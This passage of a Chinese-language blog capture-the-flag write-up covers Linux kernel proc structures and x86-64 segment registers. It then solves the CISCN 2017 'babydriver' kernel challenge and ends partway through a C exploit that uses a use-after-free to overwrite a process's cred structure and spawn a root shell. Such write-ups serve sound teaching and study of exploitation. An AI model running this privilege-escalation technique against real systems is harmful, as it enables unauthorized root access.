class="type">long</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line">	<span class="type">long</span>	(*proc_compat_ioctl)(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">int</span>	(*proc_mmap)(<span class="keyword">struct</span> file *, <span class="keyword">struct</span> vm_area_struct *);</span><br><span class="line">	<span class="type">unsigned</span> <span class="title function_">long</span> <span class="params">(*proc_get_unmapped_area)</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>)</span>;</span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>proc_dir_entry则是proc文件系统下目录的存储结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> &#123;</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * number of callers into module in progress;</span></span><br><span class="line"><span class="comment">	 * negative -&gt; it&#x27;s going away RSN</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">atomic_t</span> in_use;</span><br><span class="line">	<span class="type">refcount_t</span> refcnt;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">pde_openers</span>;</span>	<span class="comment">/* who did -&gt;open, but not -&gt;release */</span></span><br><span class="line">	<span class="comment">/* protects -&gt;pde_openers and all struct pde_opener instances */</span></span><br><span class="line">	<span class="type">spinlock_t</span> pde_unload_lock;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">completion</span> *<span class="title">pde_unload_completion</span>;</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inode_operations</span> *<span class="title">proc_iops</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_ops</span> *<span class="title">proc_ops</span>;</span></span><br><span class="line">		<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_dir_ops</span>;</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">dentry_operations</span> *<span class="title">proc_dops</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> *<span class="title">seq_ops</span>;</span></span><br><span class="line">		<span class="type">int</span> (*single_show)(<span class="keyword">struct</span> seq_file *, <span class="type">void</span> *);</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="type">proc_write_t</span> write;</span><br><span class="line">	<span class="type">void</span> *data;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> state_size;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> low_ino;</span><br><span class="line">	<span class="type">nlink_t</span> nlink;</span><br><span class="line">	<span class="type">kuid_t</span> uid;</span><br><span class="line">	<span class="type">kgid_t</span> gid;</span><br><span class="line">	<span class="type">loff_t</span> size;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">parent</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rb_root</span> <span class="title">subdir</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> <span class="title">subdir_node</span>;</span></span><br><span class="line">	<span class="type">char</span> *name;</span><br><span class="line">	<span class="type">umode_t</span> mode;</span><br><span class="line">	u8 flags;</span><br><span class="line">	u8 namelen;</span><br><span class="line">	<span class="type">char</span> inline_name[];</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<hr>
<p>继续跟进<code>proc_create_data</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> proc_dir_entry *<span class="title function_">proc_create_data</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name, <span class="type">umode_t</span> mode,</span></span><br><span class="line"><span class="params">		<span class="keyword">struct</span> proc_dir_entry *parent,</span></span><br><span class="line"><span class="params">		<span class="type">const</span> <span class="keyword">struct</span> proc_ops *proc_ops, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line">	p = proc_create_reg(name, mode, &amp;parent, data);</span><br><span class="line">	<span class="keyword">if</span> (!p)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	p-&gt;proc_ops = proc_ops;</span><br><span class="line">	pde_set_flags(p);</span><br><span class="line">	<span class="keyword">return</span> proc_register(parent, p);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(proc_create_data);</span><br></pre></td></tr></table></figure>
<p>其中<code>proc_create_reg</code>的主要功能是创建并返回一个<code>proc_dir_entry</code>结构体指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> proc_dir_entry *<span class="title function_">proc_create_reg</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name, <span class="type">umode_t</span> mode,</span></span><br><span class="line"><span class="params">		<span class="keyword">struct</span> proc_dir_entry **parent, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((mode &amp; S_IFMT) == <span class="number">0</span>)</span><br><span class="line">		mode |= S_IFREG;</span><br><span class="line">	<span class="keyword">if</span> ((mode &amp; S_IALLUGO) == <span class="number">0</span>)</span><br><span class="line">		mode |= S_IRUGO;</span><br><span class="line">	<span class="keyword">if</span> (WARN_ON_ONCE(!S_ISREG(mode)))</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	p = __proc_create(parent, name, mode, <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">if</span> (p) &#123;</span><br><span class="line">		p-&gt;proc_iops = &amp;proc_file_inode_operations;</span><br><span class="line">		p-&gt;data = data;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>之后设置p-&gt;proc_ops = proc_ops;相当于完成注册函数</p>
<p>再返回函数proc_register进行注册</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* returns the registered entry, or frees dp and returns NULL on failure */</span></span><br><span class="line"><span class="keyword">struct</span> proc_dir_entry *<span class="title function_">proc_register</span><span class="params">(<span class="keyword">struct</span> proc_dir_entry *dir,</span></span><br><span class="line"><span class="params">		<span class="keyword">struct</span> proc_dir_entry *dp)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (proc_alloc_inum(&amp;dp-&gt;low_ino))</span><br><span class="line">		<span class="keyword">goto</span> out_free_entry;</span><br><span class="line"></span><br><span class="line">	write_lock(&amp;proc_subdir_lock);</span><br><span class="line">	dp-&gt;parent = dir;</span><br><span class="line">	<span class="keyword">if</span> (pde_subdir_insert(dir, dp) == <span class="literal">false</span>) &#123;</span><br><span class="line">		WARN(<span class="number">1</span>, <span class="string">&quot;proc_dir_entry &#x27;%s/%s&#x27; already registered\n&quot;</span>,</span><br><span class="line">		     dir-&gt;name, dp-&gt;name);</span><br><span class="line">		write_unlock(&amp;proc_subdir_lock);</span><br><span class="line">		<span class="keyword">goto</span> out_free_inum;</span><br><span class="line">	&#125;</span><br><span class="line">	dir-&gt;nlink++;</span><br><span class="line">	write_unlock(&amp;proc_subdir_lock);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> dp;</span><br><span class="line">out_free_inum:</span><br><span class="line">	proc_free_inum(dp-&gt;low_ino);</span><br><span class="line">out_free_entry:</span><br><span class="line">	pde_free(dp);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>更细的暂且不做分析</p>
<h2 id="延拓2"><a href="#延拓2" class="headerlink" title="延拓2"></a>延拓2</h2><p>​    Intel处理器实现了6个段寄存器，用来方便程序设计者对程序的代码、数据和栈进行分段和引用.</p>
<p>通常来说</p>
<ol>
<li>代码段用cs寄存器来分段和引用</li>
<li>数据段用ds寄存器来分段和引用</li>
<li>栈段用ss寄存器来分段和引用</li>
<li>另外3个段寄存器es、fs和gs可以用来分段和引用额外的数据段。</li>
</ol>
<p>​    在程序执行代码段里的代码、或访问数据段中的数据之前，需要事先将合法的16位段选择符的值加载到适当的段寄存器中，否则无法执行代码或访问数据。因此，虽然一个程序可以有很多段，但是某一时刻最多可以同时使用的只有其中的6个。要引用其他段，就要先加载对应的段选择符到适当的段寄存器中。</p>
<p>​    每个段寄存器都包含两个部分：对开发者可见的部分和不可见的隐藏部分。每当向一个段寄存器中加载段选择符的时候，处理器会自动将段选择符指向的段描述符中的基地址、限长和一些属性信息加载到段寄存器中的隐藏部分。</p>
<p>​    如果系统软件对某个段描述符进行了修改，那么系统软件也有责任重新加载对应的段寄存器，以确保对段描述符所做的修改能够生效（尤其是隐藏部分）。如果系统软件不重载段寄存器，那么缓存在段寄存器中隐藏部分的旧信息还会被继续使用。但从另一个角度来讲，只要不重载段寄存器，段寄存器的隐藏部分的内容就不会发生变化，在进行处理器模式切换的时候，比如从实模式切换到保护模式时之所以能够顺利执行，也是得益于这一原理。</p>
<h3 id="x86-64处理器模式下的段寄存器"><a href="#x86-64处理器模式下的段寄存器" class="headerlink" title="x86-64处理器模式下的段寄存器"></a>x86-64处理器模式下的段寄存器</h3><p>​    Intel理解到了现代操作系统设计者的想法，于是在x86-64处理器模式中，在微架构层将分段单元中的绝大多数功能都绕开了（注意不是关闭了分段单元）。</p>
<p>​    具体来说，在加载cs、ds、es和ss寄存器时，对应的段描述符中的基地址，限长和部分属性字段一概被忽略，并假设基地址总为0，限长总为2^64-1。同样在使用ds、es和ss段前缀的时候，也都做出同样的假设；同时，这些段寄存器中隐藏部分中与上述对应的字段也被忽略。因此x86-64处理器模式只支持平坦内存模型，即从0开始到2^48-1结束的规范化的虚拟地址空间，这是x86-64处理器模式中所做的硬性规定，因为这些规定可以进一步加快逻辑地址到虚拟地址的转换效率。</p>
<h3 id="x86-64处理器模式下的fs-gs段寄存器"><a href="#x86-64处理器模式下的fs-gs段寄存器" class="headerlink" title="x86-64处理器模式下的fs/gs段寄存器"></a>x86-64处理器模式下的fs/gs段寄存器</h3><p>​    虽说分段单元在x86-64处理器模式中绝大多数的情况下都被绕过了，但少数情况下不会绕过，就比如fs和gs段寄存器</p>
<p>​    但是64位处理器模式下的分段单元的微架构逻辑还是有些新的“猫腻”，具体做法是：获取fs和gs寄存器中隐藏部分的x86-64基地址（后文简写为fs.base和gs.base）的方式不再是通过fs和gs寄存器所指向的GDT/IDT中的段描述符来指定，而是在物理上就将fs和gs寄存器中隐藏部分中的64位基地址直接在物理上映射到了IA32_FS_BASE MSR（复位值为0）和IA32_GS_BASE MSR（复位值为0）这两个MSR上（或者说IA32_FS_BASE MSR和IA32_GS_BASE MSR分别是fs.base和gs.base的别名）。系统软件可以事先对这两个MSR进行编程，以便软件能够用fs和gs寄存器对特殊的数据进行引用。</p>
<p>具体来说，现代Linux x86-64下的fs/gs段寄存器的用途分别为：</p>
<ul>
<li><strong>用户态使用fs寄存器引用线程的glibc TLS和线程在用户态的stack canary；用户态的glibc不使用gs寄存器；应用可以自行决定是否使用该寄存器</strong></li>
<li><strong>内核态使用gs寄存器引用percpu变量和进程在内核态的stack canary；内核态不使用fs寄存器。</strong></li>
</ul>
<h2 id="模块地址获取"><a href="#模块地址获取" class="headerlink" title="模块地址获取"></a>模块地址获取</h2><ul>
<li>cat /proc/modules </li>
<li>cat /proc/devices </li>
<li>cat /proc/kallsyms </li>
<li>lsmod </li>
<li>dmesg</li>
</ul>
<h1 id="CISCN-2017-babydriver"><a href="#CISCN-2017-babydriver" class="headerlink" title="CISCN 2017 babydriver"></a>CISCN 2017 babydriver</h1><h2 id="文件分析-1"><a href="#文件分析-1" class="headerlink" title="文件分析"></a>文件分析</h2><p>看一下boot.sh</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   │ File: ../boot.sh</span><br><span class="line">───────┼─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ #!/bin/bash</span><br><span class="line">   2   │ </span><br><span class="line">   3   │ qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &#x27;console=ttyS0 root=/dev</span><br><span class="line">       │ /ram oops=panic panic=1&#x27; -enable-kvm -monitor /dev/null -m 256M --nographic  -smp cores</span><br><span class="line">       │ =1,threads=1 -cpu kvm64,+smep</span><br></pre></td></tr></table></figure>
<p>看到开启了smep保护</p>
<p>再看init</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">       │ File: init</span><br><span class="line">───────┼─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ #!/bin/sh</span><br><span class="line">   2   │  </span><br><span class="line">   3   │ mount -t proc none /proc</span><br><span class="line">   4   │ mount -t sysfs none /sys</span><br><span class="line">   5   │ mount -t devtmpfs devtmpfs /dev</span><br><span class="line">   6   │ chown root:root flag</span><br><span class="line">   7   │ chmod 400 flag</span><br><span class="line">   8   │ exec 0&lt;/dev/console</span><br><span class="line">   9   │ exec 1&gt;/dev/console</span><br><span class="line">  10   │ exec 2&gt;/dev/console</span><br><span class="line">  11   │ </span><br><span class="line">  12   │ insmod /lib/modules/4.4.72/babydriver.ko</span><br><span class="line">  13   │ chmod 777 /dev/babydev</span><br><span class="line">  14   │ echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">  15   │ setsid cttyhack setuidgid 1000 sh</span><br><span class="line">  16   │ </span><br><span class="line">  17   │ umount /proc</span><br><span class="line">  18   │ umount /sys</span><br><span class="line">  19   │ poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
<p>其中insmod加载了babydriver.ko驱动</p>
<h2 id="模块分析-1"><a href="#模块分析-1" class="headerlink" title="模块分析"></a>模块分析</h2><p>checksec</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/babydriver/babydriver.ko&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>
<p>几乎没有保护</p>
<p>根据fops结构体可以知道驱动提供的外部接口对应如下</p>
<ul>
<li>open =&gt; babyopen</li>
<li>read =&gt; babyread</li>
<li>write =&gt; babywrite</li>
<li>ioctl =&gt; babyioctl</li>
<li>free =&gt; babyrelease</li>
</ul>
<p><strong>babyioctl:</strong> 定义了 0x10001 的命令，可以释放全局变量 babydev_struct 中的 device_buf，再根据用户传递的 size 重新申请一块内存，并设置 device_buf_len。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="type">void</span> __fastcall <span class="title function_">babyioctl</span><span class="params">(file *filp, <span class="type">unsigned</span> <span class="type">int</span> command, <span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, *(_QWORD *)&amp;command);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (<span class="type">char</span> *)_kmalloc(v4, <span class="number">0x24000C0</span>LL);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">&quot;alloc done\n&quot;</span>, <span class="number">0x24000C0</span>LL, v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;\x013defalut:arg is %ld\n&quot;</span>, v3, v3);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>babyopen:</strong> 申请一块空间，大小为 0x40 字节，地址存储在全局变量 babydev_struct.device_buf 上，并更新 babydev_struct.device_buf_len</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyopen</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  babydev_struct.device_buf = (<span class="type">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">0x24000C0</span>LL, <span class="number">0x40</span>LL);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64LL</span>;</span><br><span class="line">  printk(<span class="string">&quot;device open\n&quot;</span>, <span class="number">0x24000C0</span>LL, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>babyread:</strong> 先检查长度是否小于 babydev_struct.device_buf_len，然后把 babydev_struct.device_buf 中的数据拷贝到 buffer 中，buffer 和长度都是用户传递的参数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">babyread</span><span class="params">(file *filp, <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">      copy_to_user(buffer, babydev_struct.device_buf, v4);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>babywrite:</strong> 类似 babyread，不同的是从 buffer 拷贝到全局变量中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">babywrite</span><span class="params">(file *filp, <span class="type">const</span> <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">      copy_from_user(babydev_struct.device_buf, buffer, v4);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>babyrelease:</strong> 释放空间，没什么好说的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  kfree(babydev_struct.device_buf);</span><br><span class="line">  printk(<span class="string">&quot;device release\n&quot;</span>, filp, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="细节问题"><a href="#细节问题" class="headerlink" title="细节问题"></a>细节问题</h3><p>本题fops结构体,ida显示并未注册babyrelease函数,但真正做题的时候发现是注册了的</p>
<p>一开始很困惑,以为是什么特殊的机制,最后发现babyrelease的函数位置就是0</p>
<p>也就是说本来是注册了的,但是因为值刚好是0,ida看不出来,才显示未注册</p>
<p>并且更进一步可以得到,所有未注册的函数最终都默认注册babyrelease因为未注册就显示NULL,而babyrelease就是null(0)</p>
<p>不过也仅限这题了</p>
<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>观察到babyrelease函数只是free,并没有置零且存储chunk的指针是全局变量</p>
<p>如果我们同时打开两个babydev设备文件</p>
<p>并将其中一个释放那么就可以uaf了,那如何利用这个uaf</p>
<h3 id="思路1"><a href="#思路1" class="headerlink" title="思路1"></a><strong>思路1</strong></h3><p><strong>此种方法在较新版本 kernel 中已不可行，我们已无法直接分配到 cred_jar 中的 object</strong>，这是因为 cred_jar 在创建时设置了 <code>SLAB_ACCOUNT</code> 标记，在 <code>CONFIG_MEMCG_KMEM=y</code> 时（默认开启）<strong>cred_jar 不会再与相同大小的 kmalloc-192 进行合并</strong></p>
<p>但在本题版本可以分配到刚才释放的chunk</p>
<p>因此可以伪造cred结构体,修改权限</p>
<p>并fork一个程序</p>
<p><strong>exp:</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> device1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">	<span class="type">int</span> device2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	ioctl(device1, <span class="number">0x10001</span>, <span class="number">0xa8</span>);</span><br><span class="line">	close(device1);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> new_process_pid = fork();</span><br><span class="line">	<span class="keyword">if</span> (new_process_pid &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;[*] fork error&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (new_process_pid == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">char</span> lots_zero[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">		write(device2, lots_zero, <span class="number">28</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (getuid() == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;[*] got root&quot;</span>);</span><br><span class="line">			system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	